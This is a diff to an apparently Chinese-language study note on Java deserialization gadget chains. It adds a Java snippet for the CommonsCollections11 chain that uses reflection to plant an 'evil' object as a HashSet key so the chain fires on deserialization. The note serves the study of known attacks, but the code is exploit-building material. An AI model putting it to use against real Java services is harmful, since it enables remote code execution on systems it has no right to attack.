@@ -162,6 +162,44 @@ field1.set(expression, valueExpression);
 ```
 
 HashSet
+
+cc11中
+```
+//触发hashset
+HashSet hashset = new HashSet(1);
+hashset.add("foo");
+Field f = null;
+try {
+    f = HashSet.class.getDeclaredField("map");
+} catch (NoSuchFieldException e) {
+    f = HashSet.class.getDeclaredField("backingMap");
+}
+f.setAccessible(true);
+HashMap hashset_map = (HashMap) f.get(hashset);
+
+Field f2 = null;
+try {
+    f2 = HashMap.class.getDeclaredField("table");
+} catch (NoSuchFieldException e) {
+    f2 = HashMap.class.getDeclaredField("elementData");
+}
+
+f2.setAccessible(true);
+Object[] array = (Object[])f2.get(hashset_map);
+
+Object node = array[0];
+if(node == null){
+    node = array[1];
+}
+Field keyField = null;
+try{
+    keyField = node.getClass().getDeclaredField("key");
+}catch(Exception e){
+    keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
+}
+keyField.setAccessible(true);
+keyField.set(node,evil);
+```
     
 ```
 HashSet hashSet = new HashSet(1);
